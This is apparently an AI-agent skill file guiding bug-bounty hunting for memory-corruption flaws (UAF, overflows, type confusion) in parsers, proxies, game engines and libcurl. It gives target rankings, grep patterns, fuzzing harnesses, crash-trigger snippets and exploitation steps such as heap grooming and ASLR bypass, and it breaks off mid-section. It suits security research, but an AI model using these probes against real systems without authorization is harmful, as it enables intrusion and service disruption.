---
name: hunt-memory-corruption
description: Hunting skill for memory-corruption vulnerabilities — use-after-free, stack/heap/classic buffer overflow, out-of-bounds read/write, integer overflow/underflow, NULL dereference, type confusion, and double free. Built from 938 assigned reports of which 779 FULL disclosed-report texts were mined, including Valve Source-engine RCEs via crafted maps/textures (#550625, #351014, #505173), an OOB-read-to-RCE in CS:GO entity handlers (#807772, $7,500), shopify-scripts/mruby type confusions and UAFs (#181879 $18,000, #181910 $10,000, #181321, #3679660), Squid pre-auth Host-header and Basic-Auth heap overflows (#778610, #641240), php-fpm PATH_INFO underflow RCE (#722327, CVE-2019-11043), and a large modern libcurl corpus covering UAFs, OOB reads, off-by-one and integer-overflow bugs. Use when hunting memory corruption in native parsers, protocol stacks, engines/sandboxes, embedded libraries, or any attack surface that funnels attacker-controlled length/type/lifetime data into native code.
sources: github, hackerone_public, internet_bug_bounty, oss_security_lists, fuzzing_repositories
report_count: 938
full_reports_read: 779
---

## Crown Jewel Targets

Memory corruption pays highest when attacker-controlled data reaches **native code before meaningful validation**, and when the corrupted process runs with privileges or on a machine the victim cares about. Priority targets, ordered by the signal density seen across the 779 reports:

- **Client applications with auto-downloaded content** — game engines that fetch custom maps, textures, and models from a server the victim connects to. The Valve cluster (`#550625`, `#351014`, `#505173`, `#807772`) is the canonical pattern: attacker hosts a malicious server, victim connects, malicious asset is downloaded and parsed, EIP is overwritten.
- **Pre-authentication network parsers and proxies** — Squid reverse proxy Host-header stack overflow (`#778610`), Squid Basic-Auth base64 heap overflow reachable "even when basic auth isn't configured" (`#641240`), php-fpm `PATH_INFO` underflow (`#722327`), mod_proxy_fcgi (`#36264`), Exim BDAT header UAF (`#296991`). No login required = maximum reachability.
- **Embedded C/C++ libraries reachable through a managed wrapper** — libcurl appears in *dozens* of the highest-signal reports (`#2871792`, `#3340109`, `#3638715`, `#3462525`, `#3427343`, `#3417428`, `#3617719`, `#4030333`, `#4118643`, `#3736234`). If a product ships libcurl, libevent, libxml2, ZeroMQ (`#477073`), or PHP, the library's parser bugs are the product's bugs.
- **Scripting / sandbox engines that accept user code** — mruby and shopify-scripts produced a cluster of type confusions, UAFs and DOS-to-RCE bugs (`#181879` $18,000, `#181910` $10,000, `#181321`, `#181871`, `#3679660`, `#185387`, `#119657`). Bugs here often cross a trust boundary from "sandboxed script" to "host process."
- **Image / media processing pipelines** — PHP `exif_*` OOB reads (`#675578`, `#665330`, `#344035`, `#160294`), XML-RPC base64 overread (`#477897`), Reddit's corrupted-upload + MIME-swap path (`#996041`). Image upload + server-side processing is one of the most reliable fuzzing targets.
- **Filesystem/DB file loaders and import features** — MyISAM `.MYI` key segments (`#3771147`), malformed SQLite changesets (`#3736889`), MariaDB-dump `quote_name()` (`#3788482`), php-fpm and Phar unserialize (`#73238`), `.BSP` map files (`#351014`). Client-side tools that open attacker-supplied files are high-severity.
- **Kernel / driver interfaces** — AF_PACKET signedness (`#684567`), UFO-to-non-UFO path switch (`#684573`), CVE-2017-6074 double free (`#347282`). Unprivileged LPE.
- **Cloud metadata / internal-network-adjacent parsers** — where a type confusion in an IP parser becomes SSRF (`#2493548`, `#2552179`), or an uninitialized HTTP/2 read becomes a process-wide DoS (`#335533`).

Payouts are highest when the primitive is a **write** (EIP/RIP control, overlapping chunks, arbitrary R/W) rather than a read or a clean crash. Reads still matter when they leak memory layout to defeat ASLR (`#807772` "out of bound reads get an e[…]", `#187134` explicitly discusses recovering internal memory layout to circumvent ASLR) or leak secrets (`#3771139`, `#4099194`).

### Severity Ranking by Primitive (use this to triage what you find)

| Primitive | Typical severity | Corpus anchor |
|---|---|---|
| Controlled-length stack overflow overwriting saved return address | Critical — client or server RCE | `#550625`, `#351014`, `#3340109`, `#3788482` |
| Heap overflow with groomed overlapping chunk → arbitrary R/W | Critical — RCE | `#3324190`, `#3340109` |
| UAF with reclaimed object / fake vtable | Critical — RCE | `#3679660`, `#3638715`, `#3355213` |
| Type confusion reaching an invalid cast or JIT assumption | High–Critical — RCE | `#181879`, `#181910`, `#198734`, `#996041` |
| Integer underflow/overflow → controlled OOB write | High–Critical | `#722327`, `#3771139`, `#3417428` |
| Unauthenticated parser crash / uninitialized read | Medium–High — process-wide DoS | `#335533`, `#3434510`, `#477073` |
| OOB read leaking memory or secrets | Medium–High, or a step toward RCE | `#807772`, `#4099194`, `#3617719` |
| NULL dereference | Low–Medium — usually local DoS | `#3736234`, `#2559558`, `#180908` |
| Unbounded allocation / decompression bomb | Medium — availability | `#1614330`, `#2552192`, `#3734947` |

### What Makes a Crown-Jewel Report

- **No authentication required** — a header, a cookie, or a file the victim downloads is enough (`#778610`, `#641240`, `#550625`).
- **A deterministic minimized input** — 19 bytes (`#3736889`) or three characters (`#185387`), not "sometimes crashes under load."
- **A named function and a named wrong operation** — "the bounds check uses `>` instead of `>=`" (`#3427343`) is far stronger than "malloc bug."
- **A sanitizer trace attached** — the report should read like `#3306456` or `#3355213`, with the exact ASan line.
- **A trust boundary crossed** — sandbox → host (`#181879`), guest → kernel (`#684573`), client → server (`#722327`), user → other tenant (`#3771139`).

---

## Attack Surface Signals

### Native / binary surfaces (where the actual corruption lives)

```
Game/map/texture/mesh loaders (.BSP, .txt detail files, VTF, WAD)
Image & EXIF parsers (JPEG, PNG, TIFF, thumbnails, SVG rasterization)
Protocol parsers reachable pre-auth:
  HTTP Host header / Basic-Auth base64 / cookies / Set-Cookie
  HTTP/2 frames (GOAWAY, pseudo-headers, CONNECT, RST_STREAM, 1xx)
  HTTP/3 / WebSocket (auto-PONG, paused transfers, wss uploads)
  MQTT / SMB / telnet / FTP / DNS-over-HTTPS / DO-H / X.509
TLS/certificate parsing with alternate backends:
  GnuTLS, mbedTLS, Rustls, Schannel, OpenSSL providers
Serialization/deserialization: unserialize, WDDX, Phar, GMP, JSON
Script engines / JIT / sandboxes: mruby, Range/NoMethodError constants
Kernel ioctls, AF_PACKET, UFO, eBPF verifier
```

### Web-facing surfaces that funnel attacker data into those parsers

The frequency table across 779 reports is dominated by *discovery surfaces*, not bug classes:

| Surface | Reports | Typical funnel |
|---|---|---|
| search-filter-sort | 222 | attacker string → length arithmetic / fixed buffer |
| public-code-search | 199 | researcher reads OSS source, finds `strcpy`/`sprintf` |
| dos-resource | 185 | unbounded allocation / recursion / decompression chain |
| debug-error-leak | 164 | crash dumps, ASan traces, SIGSEGV messages |
| comment-injection | 143 | stored UGC → rendered/parsed by a native component |
| image-processing | 117 | upload → thumbnail/EXIF/SVG parse |
| internal-network | 88 | SSRF-adjacent reachability to native services |
| path-traversal-lfi | 88 | attacker path → file loader / SMB / DOS path sanitizer |
| blind-oob | 84 | crash/confirmation without direct output |
| api-endpoint | 80 | JSON body → native length field |
| redirect-handling | 76 | URL API with `CURLU_DEFAULT_SCHEME` → NULL deref |
| cookie-handling | 61 | oversized cookie → stack/heap overflow |
| fuzzing-enumeration | 57 | AFL/ASan harness → minimized crashing input |
| import-feature | 55 | file import → parser |
| filter-bypass | 53 | MIME/type confusion in upload filters |

### Code smells to grep for in source or JS bundles

```bash
# Unsafe copies and fixed buffers
grep -rE "strcpy|strcat|sprintf|vsprintf|memcpy|alloca|char [a-z_]+\[[0-9]+\]" --include=*.c --include=*.cc --include=*.cpp
# Off-by-one and sign/size arithmetic
grep -rE "sizeof\([^)]*\)\s*[-+]|>\s*sizeof|len\s*-\s*1|size_t.*int|int.*size_t|\(DWORD\)|\(uint32_t\)" --include=*.c --include=*.cpp
# Lifetime / reentrancy
grep -rE "free\(|delete |release\(|decref|refcount|--ref|callback|reenter|mutable" --include=*.c --include=*.cpp
# Type confusion / deserialization
grep -rE "unserialize|dyncast|dynamic_cast|type.?tag|vtable|redefine|define_singleton|__wakeup" --include=*.php --include=*.rb --include=*.cpp
```

### Runtime signals that a bug is real (not just a crash)

- **ASan/UBSan/TSan report with a stack trace** — `#3355213` "AddressSanitizer (ASan) reports a heap-use-after-free read during the request send path"; `#3324190` "I found a heap-buffer-overflow in the `doh_req_encode` function"; `#344035` "This was discovered using AFL."
- **EIP/RIP overwritten with a recognizable pattern** — `#550625`: "The EIP will be overwritten to `0x61616161`."
- **Deterministic minimized input** — `#3736889` "a malformed 19-byte changeset that causes a process crash"; `#185387` "The minimised file causing the crash is: f ()".
- **Sanitizer-built PoC with exact compiler flags** — `#3306456` documents `cmake .. -DCMAKE_C_FLAGS="-g -O1 -fsanitize=address"`.

### Language-Specific Code Smells

```c
/* C/C++ — the classic corpus primitives */
char buf[256];
strcpy(buf, user_path);              /* unbounded copy → stack overflow */
if (len > sizeof(buf)) return -1;    /* off-by-one: should be >= (#3427343) */
size_t decodedLen = 0;
base64_decode_update(..., decodedAuthToken, ...);  /* 8192 static buffer (#641240) */
free(obj); callback(obj);            /* use after free (#3682666, #3580247) */
obj->ref--; if (!obj->ref) release(obj); use(obj);   /* refcount UAF (#3679660) */
```

```php
/* PHP — unserialize / EXIF / XML-RPC */
unserialize($attacker);                       /* UAF & type confusion (#104018, #73238) */
$C = 'GMP'; $inner = 's:1:"1";a:3:{…R:2…}';    /* self-reference → type confusion (#198734) */
exif_read_data($uploaded_jpg);                 /* OOB reads (#675578, #665330, #344035) */
xmlrpc_decode($malformed);                    /* base64 overread (#477897) */
```

```ruby
# Ruby / mruby — runtime constant lookup and callbacks
Range = Array; (1..2).inspect                  # type confusion (#181910)
NoMethodError.define_singleton_method(:new){ "waat" }; Object.q  # (#181871)
a = [A.new]; a.clear during to_ary             # UAF / OOB read (#181321)
MRubyEngine.new twice                          # double-init UAF → RCE (#3679660)
```

```python
# Python / managed wrappers — size and type at the FFI boundary
json.dumps({chr(0x22) * 0x2AAAAAAB: 0})        # 32-bit JSON encoding heap corruption (#172403)
ctypes.c_uint32(length_64bit)                 # truncation → negative index / oversized alloc
```

### Parameter & URL Patterns to Fuzz First

```
?size=          ?len=           ?length=        ?count=         ?offset=
?q=             ?query=         ?filter=        ?sort=          ?order=
?name=          ?fullname=      ?filename=      ?path=          ?file=
?type=          ?format=        ?mime=          ?encoding=      ?charset=
?start=         ?end=           ?index=         ?id=            ?idx=
?page=          ?limit=         ?width=         ?height=        ?scale=
Authorization: Basic <base64>   Cookie: <long>  Host: <long>
Content-Type: image/png (→ image/svg+xml)       Content-Length: <huge>
```

Corpus anchors: `search-filter-sort` (222), `api-endpoint` (80), `cookie-handling` (61), `path-traversal-lfi` (88), and the Full-name overflow in `#223454`.

### Stack & Version Fingerprinting

- Exposed version banners and self-signed certs are a recon primitive: `#168485` located an old nginx instance via a Censys certificate search; `#724243` tested a vulnerability against tcpdump 4.x.
- Once a version is known, search public code for its parser and test the published PoC. Many corpus reports are re-discoveries of known CVEs in unpatched deployments (`#684573`, `#347282`, `#269568`).
- Record the exact build flags — alternate backends change reachability: `#3617719` requires a non-OpenSSL TLS backend; `#4099194` requires GnuTLS.

---

## Discovery Patterns From 779 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Public source-code search (199 reports) — what to look for:** exported OSS repos of the target or its dependencies. Researchers explicitly "poke at mruby a bit more" (`#181879`) and "found an off-by-one buffer overflow in `lib/smb.c`" (`#3427343`). Read the parser, not the marketing page. Search for the exact symbols named in disclosures: `strcpy`, `curl_msprintf`, `quote_name`, `doh_req_encode`, `encodeDN`.
2. **Search / filter / sort inputs (222 reports) — what to look for:** any parameter whose value controls a length, offset, count, or comparison. The single most frequent discovery surface in the corpus. Feed oversized values, negative values, empty values, and boundary-exact values.
3. **Crash / DoS behavior (185 reports) — what to look for:** a process that segfaults, aborts, hangs, or balloons in RSS from one request. `#832217`: "remotely crash any user's app instantly just by sending a simple message"; `#335533`: "Malformed HTTP/2 frames cause NodeJS http2 module to perform an uninitialized read."
4. **Debug / error output (164 reports) — what to look for:** stack traces, ASan reports, core files, verbose error messages. `#2887487`: "Use AddressSanitizer (ASAN) or similar tools to detect overflows during testing." Errors are the oracle that turns a crash into a classified primitive.
5. **Fuzzing with sanitizers (57 reports) — what to look for:** a harness around the parser. `#477344` "found while fuzzing with AFL using an ASAN instrumented PHP"; `#245221` "crash was triggered with `642f773` while fuzzing `tile-count-merge` with AFL on Debian 8 x64"; `#269568` Optionsbleed.
6. **Image / file upload (117 image-processing, 20 file-upload) — what to look for:** the MIME/type gate. `#996041`: "upload a normal PNG file … changing the content type from `image/png` to `image/svg+xml`". Corrupt the *bytes* after passing the type check.
7. **Import / export features (55 / 28) — what to look for:** file loaders that trust embedded length fields. `#3771147`: `keyseg->start`/`keyseg->length` "read directly" from a `.MYI` file. `#73238`: crafted length in serialized Phar data.
8. **Protocol fuzzing of pre-auth listeners (port-scanning/time-based signals) — what to look for:** raw sockets to MQTT/SMB/telnet/HTTP2/H2-CONNECT. `#3575475` found "a buffer overflow in curl's telnet protocol handler that allows remote memory corruption without authentication."
9. **Cookie / header / session handling (61 / 54) — what to look for:** oversized or duplicate headers. `#3340109` describes an 8KB `huge_cookie` stack buffer in cURL cookie parsing; `#641240` base64-decodes a Basic-Auth header into a fixed 8192-byte stack buffer with `decodedLen = 43011`.
10. **Deserialization endpoints (38) — what to look for:** object graphs with self-references. `#198734` uses `R:2` references inside a GMP object to trigger type confusion; `#104018` "Multiple Use After Free Vulnerabilities in unserialize()".
11. **XML / document parsers (35) — what to look for:** node replacement, entity expansion, external references. `#259390` UAF in `XML::LibXML::Node::replaceChild`; `#477897` base64 overread in XML-RPC.
12. **Redirect / URL handling (76) — what to look for:** URL APIs with default schemes and re-entrant callbacks. `#3736234` NULL deref in `redirect_url()` with `CURLU_DEFAULT_SCHEME`; `#3682666` export callback re-entering import on the same handle.
13. **Concurrency / shared objects (race-condition 10) — what to look for:** double-init, shared bytearrays, connection pools. `#3638715` UAF in `url_move_hostname()` via a shared connection pool; `#37240` and `#47227` double frees from Flash workers.
14. **Cloud metadata / internal network (31 / 88) — what to look for:** type conversions that change the *destination* of a fetch. `#2493548` "Incorrect Type Conversion in interpreting IPv4-mapped IPv6 addresses … results in indeterminate SSRF"; `#2552179` Best-Fit Unicode mapping to `169.254.169.254`.
15. **Version/recon exposure (recon 2, internet-search-engine 1) — what to look for:** outdated listening versions. `#168485`: "I discovered an instance of nginx version 1[.4.6] … found the self-signed certificate for this server (censys)".

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Counts are the number of full reports in the corpus containing the signal (multiple signals per report).

| Rank | Signal | Count | Why it matters / what to probe |
|---|---|---|---|
| 1 | search-filter-sort | 222 | Length/count comparisons dominate; probe oversized, empty, negative, boundary-N and N+1 values. |
| 2 | public-code-search | 199 | The bug is in a repo you can read; grep unsafe copy primitives and audit the parser. |
| 3 | dos-resource | 185 | Unbounded allocation/recursion is a reportable primitive and often a memory-safety precursor; probe huge sizes and compression/decompression chains. |
| 4 | debug-error-leak | 164 | Crash traces classify the primitive; build with ASan and capture the report. |
| 5 | comment-injection | 143 | Stored UGC later parsed by native code; plant malformed content, then trigger the render path. |
| 6 | image-processing | 117 | Rich binary format parsers with many length fields; fuzz EXIF/thumbnail/texture paths. |
| 7 | internal-network | 88 | Reachability multiplies severity; determine if the parsed request targets loopback/link-local. |
| 8 | path-traversal-lfi | 88 | Attacker-controlled paths reach filesystem/SMB/DOS sanitizers with fixed buffers (`#3427343`, `#3804525`). |
| 9 | blind-oob | 84 | Some crashes are observable only out-of-band; use timing/collaborator-style canaries. |
| 10 | api-endpoint | 80 | JSON bodies carry native length fields; fuzz numeric fields directly. |
| 11 | redirect-handling | 76 | Re-validation gaps and NULL derefs in URL APIs (`#3736234`, `#2871792`). |
| 12 | js-source-review | 63 | Client bundles reveal which native parser a field reaches. |
| 13 | cookie-handling | 61 | Fixed stack/heap buffers for decoded cookies (`#3340109`, `#1614328`). |
| 14 | fuzzing-enumeration | 57 | AFL/libFuzzer + ASan is the highest-yield discovery method for parser bugs. |
| 15 | import-feature | 55 | File import trusts embedded offsets/lengths (`#3771147`, `#172403`). |
| 16 | session-attack | 54 | Teardown/refcount paths (`#4118643` provider use-after-free). |
| 17 | filter-bypass | 53 | MIME/type gates are circumventable, opening the native parser (`#996041`, `#3771147`). |
| 18 | stored | 47 | Persisted malicious input crosses requests and users. |
| 19 | server-side-rendering | 46 | Server-rendered templates/images feed native rasterizers (`#996041`, `#550625`). |
| 20 | cache-layer | 42 | Cached resources keep a freed/oversized object alive (`#4118643`). |
| 21 | deserialization | 38 | Self-referential objects drive UAF/type confusion (`#198734`, `#104018`, `#73238`). |
| 22 | xml-parser | 35 | Node lifetime and external-entity bugs (`#259390`, `#477897`). |
| 23 | proxy-feature | 35 | Reverse proxies parse attacker Host headers into stack buffers (`#778610`, `#36264`). |
| 24 | cloud-metadata | 31 | OOB/type bugs in parsers can pivot to metadata SSRF (`#2493548`, `#2552179`). |
| 25 | export-feature | 28 | Export callbacks re-enter and mutate live structures (`#3682666`, `#4099194`). |
| 26 | unicode-normalization | 24 | Best-Fit / UTF-16 sizing bugs (`#2552179`, `#3920633`). |
| 27 | base64-encoding | 24 | Decoded size exceeds fixed buffer (`#641240`, `#477897`). |
| 28 | dependency-confusion | 23 | Third-party lib versions carry known memory bugs (`#296991`). |
| 29 | null-byte | 16 | Terminator truncation enables off-by-one and path confusion. |
| 30 | race-condition | 10 | Double-init / shared object races produce double free/UAF (`#37240`, `#3638715`). |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

> [#996041] I started testing for unrestricted file uploads and quickly discovered a way to upload a corrupted file into Reddit.

> [#181321] However, the code does not properly check that the array length was not modified during the call of `to_ary`.

> [#3340109] I discovered a critical stack-based buffer overflow vulnerability in cURL's cookie parsing mechanism that can lead to remote code execution.

> [#181879] I've been poking at mruby a bit more and I've found a vulnerability that allows an attacker to take control of the instruction pointer.

> [#19532] I noticed that there isn't any "size check" when someone tries to upload a flie through the "upload picture" option, this could generate a memory leak or also a kind of DoS and is deangerous with bigger and bigger files.

> [#477344] This is something I found while fuzzing with AFL using an ASAN instrumented PHP.

> [#187134] I was testing out the Collaborator server and due to a lack of input points I started doing random stuff.

> [#2887487] Use AddressSanitizer (ASAN) or similar tools to detect overflows during testing.

> [#547630] I found a potential integer overflow which may lead to a buffer overrun in /curl/lib/urlapi.

> [#3324190] I found a heap-buffer-overflow in the `doh_req_encode` function in `lib/doh.

> [#675578] I have found and reported an out of bounds memory read in PHP [exif_scan_thumbnail]

> [#3470095] I discovered a heap buffer over-read vulnerability in libcurl's SMB protocol

> [#3355213] AddressSanitizer (ASan) reports a heap-use-after-free read during the request send path.

> [#3153971] I found a stack buffer overflow in curl's OpenSSL provider handling code.

> [#3575475] I found a buffer overflow in curl's telnet protocol handler that allows remote memory corruption without authentication.

> [#3736889] I found a malformed 19-byte changeset that causes a process crash when passed to `DatabaseSync#applyChangeset()` against a compatible target schema.

> [#480778] With crafted regex match, I have found a heap-over-flow in function Perl__byte_dump_string, which would lead to memory leak.

> [#3682666] During the export callback it re-enters `curl_easy_ssls_import()` on the same easy handle, mutating the session list while the export code still holds the current node.

### Probe Checklist (15 concrete probes)

1. **Oversized length fuzz** — send 4 KB, 8 KB, 64 KB strings into every search/filter/sort and full-name field; watch for ASan "stack-buffer-overflow" / "allocation-size-too-big" (#223454, #3340109, #3417428).
2. **Empty/zero-length variant** — send empty `PATH_INFO`-style variables, zero-length RSA modulus (`00 30 02 02 00`), or zero-length hostname; these trigger underflows and pre-bounds dereferences (#722327, #3617719).
3. **Boundary exact-N and N+1** — for a 1024-byte buffer, send exactly 1023 and 1024 bytes; the `>` vs `>=` off-by-one is the entire bug (#3427343).
4. **MIME swap + corrupt bytes** — upload a valid PNG, intercept, change `Content-Type` to `image/svg+xml`, then replace the body with malformed data (#996041).
5. **EXIF/thumbnail parser fuzz** — AFL/ASan a JPEG/TIFF corpus against `exif_scan_thumbnail`, `php_jpg_get16`, `exif_iif_add_value`, `exif_process_IFD_in_TIFF` (#675578, #665330, `#344035`, #160294).
6. **Base64 decode into fixed buffer** — send a Basic-Auth/header value whose decoded length far exceeds the static decode buffer (#641240).
7. **Self-referential serialized object** — build `a:1:{i:0;C:3:"GMP":…R:2…}` or WDDX/PDORow combinations to drive type confusion and UAF (#198734, #104018, #180908, #73238).
8. **Double-init / re-init** — construct the engine twice with an invalid capacity or re-run initialization, then use the stale handle (#3679660, #119657).
9. **Reentrant callback during teardown** — trigger an export callback that re-enters the same handle, or a shutdown callback that locks a freed base (#3682666, #3580247).
10. **Shared-object concurrency** — share a bytearray/connection pool between two workers or threads and clear/compress/move concurrently (#37240, #47227, #3638715).
11. **Type confusion via redefinition** — redefine `Range = Array`, override `NoMethodError.new`, or mutate an array during `to_ary` (#181910, #181871, #181321).
12. **Unicode/Best-Fit confusion** — feed GBK/UTF-16 hostnames where a mapped character changes the resolved host or overruns the sizing helper (#2552179, #2493548, #3920633).
13. **Malformed protocol frames** — send GOAWAY/HTTP2 pseudo-header frames, RST_STREAM mid-upload, and H2 CONNECT with streaming 1xx responses (#335533, #3434510, #4030333, #3734020).
14. **Integer arithmetic probes** — set `CURLOPT_POSTFIELDSIZE_LARGE` absurdly large, truncate 64→32 bit sizes, and chain decompressions to a "malloc bomb" (#3417428, #547630, #1614330).
15. **Version fingerprint + known CVE** — identify an outdated listener (nginx 1.4.6, tcpdump 4.x, mruby 1.x) and test the matching published parser exploit (#168485, #724243, #684573).

### Fuzzing Harness Templates (the highest-yield discovery method in the corpus)

```python
# libFuzzer-style harness for an image/protocol parser
def LLVMFuzzerTestOneInput(data, size):
    parser = Parser()
    parser.feed(data, size)   # must NOT catch SIGSEGV / ASan aborts
    return 0
```
```bash
# Build with ASan, seed with valid files, run a short campaign
clang -fsanitize=fuzzer,address -g -O1 harness.c -o fuzz_target
mkdir seeds && cp valid_sample.jpg seeds/
./fuzz_target -max_len=4096 -artifact_prefix=crash- seeds/
# Triage: minimize, then classify from the sanitizer report
./fuzz_target -minimize_crash=1 -exact_artifact_path=min.bin crash-abc
```

```text
# Corpus-proven fuzz targets
exif_scan_thumbnail / php_jpg_get16 / exif_iif_add_value   (#675578, #665330, #344035)
regcomp / S_grok_bslash_N                                  (#510888, CVE-2018-18313)
doh_req_encode                                              (#3324190)
tile-count-merge (AFL on Debian 8 x64)                     (#245221)
HTTP/2 frame parser (GOAWAY, pseudo-headers)                (#335533, #3434510)
AFL with ASan-instrumented PHP                              (#477344)
mosca/aedes MQTT broker (IoT-Testware fuzzing approach)     (#541354)
```

### Triage Decision Tree

```text
Crash observed
├─ ASan "stack-buffer-overflow"          → stack overflow / off-by-one → look for return-address control
├─ ASan "heap-buffer-overflow WRITE"     → heap overflow → plan overlapping chunk / arbitrary R/W
├─ ASan "heap-buffer-overflow READ"      → OOB read → check if data is returned (info leak)
├─ ASan "heap-use-after-free"            → UAF → find the FREE stack with !heap -p -a / ASan allocation trace
├─ ASan "double-free"                    → double free → identify the two free sites and the race/logic gap
├─ "SEGV on unknown address" with length → integer under/overflow or NULL deref → inspect the index math
├─ "allocation-size-too-big" / OOM       → integer overflow in size → DoS or controlled allocation
└─ hang / unbounded RSS                  → resource exhaustion → decompression chain / unlimited headers (#1614330, #2552192)
```

For each branch, record: the exact crashing byte offset, the affected version, the sanitizer line, and whether the input crosses a trust boundary. That is the difference between a closed "crash" report and a classified memory-corruption finding.

---

## Step-by-Step Hunting Methodology

1. **Choose a native funnel, not a web bug.** Decide which component actually parses bytes: image/EXIF, protocol header, file loader, script engine, or library wrapper. Read the code path that turns attacker input into a length, index, type tag, or lifetime decision. The 779-report corpus overwhelmingly starts at `public-code-search` (199) or `search-filter-sort` (222).

2. **Stand up an instrumented harness.** Compile the target with ASan/UBSan and build a minimal driver. The corpus repeatedly shows the value of this:
   ```bash
   mkdir build && cd build
   CC=clang CXX=clang++ cmake .. -DCMAKE_BUILD_TYPE=Debug \
     -DCMAKE_C_FLAGS="-g -O1 -fsanitize=address" \
     -DBUILD_SHARED_LIBS=OFF -DBUILD_TESTING=OFF
   cmake --build . --config Debug
   clang++ -g -O1 -fsanitize=address -I../include minimal_crash.cpp \
     ./lib/libtarget.a -o minimal_crash -lpsl -ldl -lpthread -lssl -lcrypto -lz
   ```
   This is exactly the workflow documented in `#3306456`. Run under `ASAN_OPTIONS=abort_on_error=1:symbolize=1` to capture a stable stack trace.

3. **Fuzz for a first crash.** Seed with valid inputs (valid PNG, valid HTTP/2 frames, valid serialized objects) and use AFL++/libFuzzer with ASan. `#477344`, `#245221`, and `#269568` are all AFL discoveries. Add a dictionary of length/type tokens (`\x00`, `0xFF`, ` ;:`, `&`, very long runs).

4. **Triage the primitive from the sanitizer report.** Do not stop at "it crashes." Classify:
   - `stack-buffer-overflow` → stack overflow / off-by-one (`#3340109`, `#3427343`, `#550625`)
   - `heap-buffer-overflow` WRITE → heap overflow, aim for overlapping chunks (`#3324190`)
   - `heap-use-after-free` → UAF, aim for fake object/vtable reuse (`#3355213`, `#3638715`)
   - `SEGV on unknown address` near a `free` → double free (`#347282`, `#37240`)
   - negative index / huge `decodedLen` → integer under/overflow (`#641240`, `#3771139`)
   - `null deref` → NULL pointer dereference (`#3736234`, `#2559558`)

5. **Minimize the crashing input.** Reduce to the smallest deterministic reproducer — `#3736889` got it to 19 bytes; `#185387` to three characters (`f ()`). A minimal input proves root cause and makes the report credible.

6. **Confirm reachability from the real attack surface.** A local harness crash is step one; show it through the actual product. For web-facing targets, that means the request that reaches the parser: oversized cookie → libcurl cookie parser (`#3340109`), corrupted upload → image processor (`#996041`), malicious Host header → reverse proxy (`#778610`).

7. **Establish who is attacked and where the process runs.** Client-side bugs require victim interaction (connect to malicious game server, open malicious file). Server-side/pre-auth bugs are usually higher severity. Note the privilege context: `#684573` gets "kernel code execution from an unprivileged process."

8. **Determine the exploit primitive** — align with the exploit-development workflow:
   - **Control achieved?** PC/IP hijack (`#181879` jumps to `0x0000133713371337`), arbitrary R/W (`#807772`), or a clean logic bypass.
   - **ASLR defeated?** Need an info leak first; OOB reads are the classic source, and `#187134` explicitly discusses recovering internal memory layout to circumvent ASLR.
   - **Heap groomed?** For UAF/heap overflow, plan overlapping chunks or tcache poisoning (see Bypass Techniques).

9. **Assess reliability.** Reproduce ≥10/10 times on a clean build. Race-based bugs (`#3638715`, `#37240`) need repeated runs and TSan confirmation. Document exact versions, sanitizer settings, and CPU/arch.

10. **Check for mitigating factors and downgrade honestly.** A null deref in a non-privileged helper is usually a low-severity DoS; a pre-auth stack overflow overwriting EIP is critical. `#4099194` self-assessed Low because it required GnuTLS plus a multi-MB upload — match that honesty.

11. **Chain when possible.** Memory corruption + SSRF, memory corruption + sandbox escape, read primitive + info leak. Examples: `#2493548` type confusion → SSRF; `#684573` memory corruption → unprivileged-to-root LPE; `#181879` type confusion → arbitrary R/W → RCE.

12. **Verify non-invented evidence before writing.** Confirm every version string, CVE, and behavior against your own harness output. Only then write the report with crash trace, minimized PoC, and impact statement.

13. **Capture the detection story for the defender.** Record the exact bytes that trigger, the affected version range, and the fix commit where known (e.g., `#550625` fixed by bounds check, `#684573` fixed in mainline). This speeds triage.

14. **Run Gate 0 Validation** (below) before submission. A crash with no demonstrated attacker benefit is frequently closed as N/A or informational.

15. **Keep a reproducibility artifact.** Save the minimized input, compiler flags, and harness in a PoC directory; the discipline used in the exploit-dev skill (replay in CI, persist crash inputs) prevents flaky reproductions.

### Common Mistakes That Get Reports Closed

- **Reporting a crash without a classified primitive.** "Segfault" is not a finding; `#181879` succeeded by showing instruction-pointer control, and `#550625` by showing EIP = `0x61616161`.
- **Testing the wrong build configuration.** `#3617719` only reproduces with a non-OpenSSL TLS backend; `#4099194` only with GnuTLS. Confirm the target's exact stack.
- **Fuzzing without a sanitizer.** Many memory-safety bugs are silent corruptions, not immediate crashes. ASan is what surfaced `#3355213`, `#3324190`, and `#344035`.
- **Ignoring the negative control.** Show that a well-formed input does *not* crash; this proves the malformed field is the cause rather than ambient instability.
- **Overstating the impact.** `#4099194` self-rated Low because of its GnuTLS + multi-MB upload preconditions. Match the disclosed standard of honesty.
- **Inventing identifiers or URLs.** Every CVE, report ID, and commit in the report must be one you actually verified — the same rule that governs this skill's citations.

### Evidence to Capture Per Step

| Step | Evidence to save |
|---|---|
| Harness build | compiler/linker command, sanitizer version, commit hash |
| Fuzzing | seed corpus, crashing file, AFL/libFuzzer stats |
| Triage | full sanitizer report with stack trace and source line |
| Minimization | smallest reproducer and the reduction log |
| Reachability | the actual product request/response, not just the harness |
| Exploitability | leak bytes, controlled pointer value, or groomed-chunk layout |
| Reliability | 10–100 run count with success rate |

---

## Payload & Detection Patterns

### Sanitizer build & triage commands

```bash
# AddressSanitizer for heap/stack/global OOB and UAF
clang -fsanitize=address -g -O1 -fno-omit-frame-pointer target.c -o target_asan

# UndefinedBehaviorSanitizer for integer overflow / sign / alignment
clang -fsanitize=undefined,integer -g -O1 target.c -o target_ubsan

# ThreadSanitizer for UAF-races / double-free races
clang -fsanitize=thread -g -O1 race_poc.c -o race_tsan -Wl,-rpath,/usr/lib
./race_tsan   # look for: WRITE of size 8 by thread T1 / previously freed by T2
```

### ASan report classification examples (from the corpus)

```
# heap-buffer-overflow WRITE (parse_connect_to_string / doh_req_encode)
==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
WRITE of size 1 at ... in parse_connect_to_string lib/connect.c:NN
→ suspect unvalidated length/escape handling (#3306456, #3324190)

# stack-buffer-overflow (cookie parsing / strcpy / quote_name)
==PID==ERROR: AddressSanitizer: stack-buffer-overflow
READ of size 1 at ... in cookie parsing → huge_cookie 8KB buffer (#3340109, #3788482)

# heap-use-after-free (shared pool / shutdown callback)
==PID==ERROR: AddressSanitizer: heap-use-after-free
READ of size 8 at ... in url_match_destination (#3638715, #3355213, #3580247)

# stack-overflow via unbounded expansion
